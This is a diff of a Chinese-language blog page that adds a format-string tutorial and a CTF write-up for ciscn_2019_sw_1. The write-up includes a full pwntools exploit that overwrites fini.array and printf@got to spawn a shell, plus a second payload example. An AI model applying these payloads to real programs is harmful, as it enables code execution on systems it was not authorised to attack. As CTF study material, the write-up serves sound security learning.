@@ -20,17 +20,29 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="1fmtstr_payload(12, &amp;#123;0x0804A048 : 35795746&amp;#125;)   参数1: offset 参数2: address 参数3: number">
+  <meta name="description" content="任意地址写  在不使用FmtStr类时，我们一般是这样来实现任意地址写的，%{number}c表示写入的数，%{index}$n表示以偏移index位置的值为地址写入，其中n写入四字节，hn写入两字节，hhn写入单字节，举例如下：  %12c%7$hhn这里我们没有另外传入地址，表示将偏移为7的值作为地址，在该地址处写入单字节的内容0xc； p32(0x80480045)+b&quot;%12c%">
 <meta property="og:type" content="article">
 <meta property="og:title" content="格式化字符串漏洞">
 <meta property="og:url" content="http://example.com/2023/05/09/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Dvgd">
-<meta property="og:description" content="1fmtstr_payload(12, &amp;#123;0x0804A048 : 35795746&amp;#125;)   参数1: offset 参数2: address 参数3: number">
+<meta property="og:description" content="任意地址写  在不使用FmtStr类时，我们一般是这样来实现任意地址写的，%{number}c表示写入的数，%{index}$n表示以偏移index位置的值为地址写入，其中n写入四字节，hn写入两字节，hhn写入单字节，举例如下：  %12c%7$hhn这里我们没有另外传入地址，表示将偏移为7的值作为地址，在该地址处写入单字节的内容0xc； p32(0x80480045)+b&quot;%12c%">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414231318.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414231359.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414231537.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414233654.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414232119.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414232835.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414233127.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414233250.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414233458.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230731160634907.png">
+<meta property="og:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230731160654833.png">
 <meta property="article:published_time" content="2023-05-09T13:36:37.000Z">
-<meta property="article:modified_time" content="2023-06-03T13:38:43.060Z">
+<meta property="article:modified_time" content="2023-07-31T08:07:22.257Z">
 <meta property="article:author" content="Dvgd">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414231318.png">
 
 <link rel="canonical" href="http://example.com/2023/05/09/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
 
@@ -125,12 +137,12 @@
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">7</span></a>
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">8</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">36</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">47</span></a>
 
   </li>
   </ul>
@@ -191,7 +203,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-06-03 21:38:43" itemprop="dateModified" datetime="2023-06-03T21:38:43+08:00">2023-06-03</time>
+                <time title="修改时间：2023-07-31 16:07:22" itemprop="dateModified" datetime="2023-07-31T16:07:22+08:00">2023-07-31</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -221,11 +233,68 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(<span class="number">12</span>, &#123;<span class="number">0x0804A048</span> : <span class="number">35795746</span>&#125;) </span><br></pre></td></tr></table></figure>
+        <h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>  在不使用FmtStr类时，我们一般是这样来实现任意地址写的，%{number}c表示写入的数，%{index}$n表示以偏移index位置的值为地址写入，其中n写入四字节，hn写入两字节，hhn写入单字节，举例如下：</p>
+<ul>
+<li><code>%12c%7$hhn</code>这里我们没有另外传入地址，表示将偏移为7的值作为地址，在该地址处写入单字节的内容0xc；</li>
+<li><code>p32(0x80480045)+b&quot;%12c%7$hhn&quot;</code>假设偏移为7的地方是字符串的第一个参数，此时的表达式为将0x80480045处的单字节改写为0xc；同样值得注意的是如果是64位程序，应将地址放在格式化表达式的后面，对应的偏移也需要修改。</li>
+</ul>
+<p>  这里我们可以看到自己构造表达式进行利用十分麻烦，下面介绍FmtStr类的使用，如下代码所示，详细的介绍内容都写在注释里面了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 64位格式化漏洞要设置一下上下文环境</span></span><br><span class="line"><span class="comment"># context.arch = &quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fmtstr_payload(offset, writes, numbwritten=0, write_size=&quot;byte&quot;)</span></span><br><span class="line"><span class="comment"># 总共四个参数：</span></span><br><span class="line"><span class="comment"># offset --&gt; 偏移量 </span></span><br><span class="line"><span class="comment"># writes --&gt; &#123;被覆盖的地址:要写入的地址&#125; 地址都为int型，也就是不需要使用p32或者p64打包</span></span><br><span class="line"><span class="comment"># numbwritten --&gt; 已经由printf函数写入的字节数，默认为0</span></span><br><span class="line"><span class="comment"># write_size --&gt; 逐byte/short/int写入，默认是byte，这样发送的字节少</span></span><br><span class="line"></span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf_got = pro.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_plt = pro.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pad = fmtstr_payload(offset, &#123;printf_got:system_plt&#125;)</span><br><span class="line">p.send(pad)</span><br></pre></td></tr></table></figure>
 
-<p>参数1: offset</p>
-<p>参数2: address</p>
-<p>参数3: number</p>
+
+
+
+
+<h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1#"></a>ciscn_2019_sw_1<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#ciscn_2019_sw_1">#</a></h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结#"></a>总结<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E6%80%BB%E7%BB%93">#</a></h3><p>根据本题，学习与收获有：</p>
+<ul>
+<li>当<code>RELRO</code>保护为<code>NO RELRO</code>的时候，<code>init.array、fini.array、got.plt</code>均可读可写；为<code>PARTIAL RELRO</code>的时候，<code>ini.array、fini.array</code>可读不可写，<code>got.plt</code>可读可写；为<code>FULL RELRO</code>时，<code>init.array、fini.array、got.plt</code>均可读不可写。</li>
+<li>程序在加载的时候，会依次调用<code>init.array</code>数组中的每一个函数指针，在结束的时候，依次调用<code>fini.array</code>中的每一个函数指针</li>
+<li>当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写<code>fini.array</code>中的函数指针为<code>main</code>函数地址，可以再执行一次<code>main</code>函数。一般来说，这个数组的长度为<code>1</code>，也就是说只能写一个地址。</li>
+</ul>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析#"></a>题目分析<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">#</a></h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec#"></a>checksec<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#checksec">#</a></h4><p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231318.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414231318.png" alt="img"></a></p>
+<h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析#"></a>函数分析<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90">#</a></h4><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231359.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414231359.png" alt="img"></a></p>
+<p>程序比较简单，只有一个<code>main</code>函数，而且就是格式化字符串漏洞。同时注意到，程序中有一个<code>sys</code>函数，里面调用了<code>system</code>。</p>
+<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h5><p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414231537.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414231537.png" alt="img"></a></p>
+<h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点#"></a>漏洞点<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E6%BC%8F%E6%B4%9E%E7%82%B9">#</a></h4><p>漏洞点很明显，就是<code>main</code>函数中的<code>格式化</code>字符串漏洞。可以并且格式化参数是一个栈变量而不是堆变量，相对来说利用难度要低一点。并且程序给了<code>system</code>函数，其实都不需要泄露地址。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路#"></a>利用思路<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF">#</a></h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点#"></a>知识点<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E7%9F%A5%E8%AF%86%E7%82%B9">#</a></h4><ul>
+<li><p>程序在结束的时候会调用<code>fini.array</code>函数指针数组中的每一个回调函数。</p>
+<p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233654.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414233654.png" alt="img"></a></p>
+</li>
+</ul>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程#"></a>利用过程<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B">#</a></h4><ul>
+<li>利用格式化字符串漏洞，将<code>fini.array[0]</code>改写为<code>main</code>函数地址，与此同时，将<code>printf@got</code>改写为<code>system@plt</code>，获得第二次执行<code>main</code>函数的机会</li>
+<li>输入<code>/bin/sh</code>获取<code>shell</code></li>
+</ul>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP#"></a>EXP<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#exp">#</a></h3><h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程#"></a>调试过程<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B">#</a></h4><ol>
+<li><p>测出<code>printf</code>格式化字符串的偏移</p>
+<p>输入：<code>aaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x</code></p>
+<p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414232119.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414232119.png" alt="img"></a></p>
+<p>测量出偏移为<code>4</code></p>
+</li>
+<li><p>第一次改写<code>fini.array</code>和<code>printf@got</code>，直接手撸：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot;</span>+ p32(<span class="number">0x804989c</span> + <span class="number">2</span>) + p32(<span class="number">0x804989c</span>) + p32(<span class="number">0x804979c</span>)</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>改写前</strong>：</p>
+<p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414232835.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414232835.png" alt="img"></a></p>
+<p><strong>改写后</strong>：</p>
+<p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233127.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414233127.png" alt="img"></a></p>
+</li>
+<li><p>第二次输入<code>/bin/sh</code>获取<code>shell</code>：</p>
+<p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233250.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414233250.png" alt="img"></a></p>
+</li>
+</ol>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp#"></a>完整exp<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14660529.html#%E5%AE%8C%E6%95%B4exp">#</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./f&#x27;</span></span><br><span class="line">p = process(pwnfile)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node1.anna.nssctf.cn&#x27;,28758)</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Welcome to my ctf! What&#x27;s your name?\n&quot;</span>)</span><br><span class="line">fini_array = <span class="number">0x0804979C</span>   <span class="comment">#在ida里面找</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># 0x080483d0</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>] <span class="comment"># 0x0804989c</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 0x08048534</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%2052c%13$hn%31692c%14$hn%356c%15$hn&#x27;</span> + p32(printf_got + <span class="number">2</span>) + p32(printf_got) + p32(fini_array)</span><br><span class="line"><span class="comment">#2052=0x0804	2052+31692=0x83d0</span></span><br><span class="line"></span><br><span class="line">payload =  p32(printf_got + <span class="number">2</span>) + p32(printf_got) + p32(fini_array)+<span class="string">b&#x27;%2040c%4$hn%31692c%5$hn%356c%6$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>远程攻击效果</strong>：</p>
+<p><a target="_blank" rel="noopener" href="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210414233458.png"><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/20210414233458.png" alt="img"></a></p>
+<p>example2:</p>
+<p><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230731160634907.png" alt="image-20230731160634907"></p>
+<p><img src="/../images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230731160654833.png" alt="image-20230731160654833"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">start_addr=<span class="number">0x080484F0</span></span><br><span class="line">fini_addr=<span class="number">0x08049934</span></span><br><span class="line"><span class="comment">#sys_plt=0x8048490</span></span><br><span class="line">payload+=p32(strlen_got+<span class="number">2</span>)  <span class="comment">#12</span></span><br><span class="line">payload+=p32(strlen_got)    <span class="comment">#13</span></span><br><span class="line">payload+=p32(fini_addr)     <span class="comment">#14</span></span><br><span class="line"><span class="comment">#format string</span></span><br><span class="line"><span class="comment">#len(&quot;Nice to meet you, &quot;)=18</span></span><br><span class="line"><span class="comment">#2020=2052-12-2-18 2052=0x0804</span></span><br><span class="line">payload+=<span class="string">&quot;%2020c%12$hn&quot;</span></span><br><span class="line"><span class="comment">#31884=0x8490-0x0804</span></span><br><span class="line">payload+=<span class="string">&quot;%31884c%13$hn&quot;</span></span><br><span class="line"><span class="comment">#96=0x84F0-0x8490 </span></span><br><span class="line">payload+=<span class="string">&quot;%96c%14$hn&quot;</span></span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -306,6 +375,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">1.</span> <span class="nav-text">任意地址写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-sw-1"><span class="nav-number">2.</span> <span class="nav-text">ciscn_2019_sw_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#checksec"><span class="nav-number">2.2.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-number">2.2.2.</span> <span class="nav-text">函数分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#main"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sys"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">sys</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-number">2.2.3.</span> <span class="nav-text">漏洞点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.3.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">2.3.2.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">2.4.</span> <span class="nav-text">EXP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">2.4.1.</span> <span class="nav-text">调试过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">2.4.2.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -321,14 +391,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
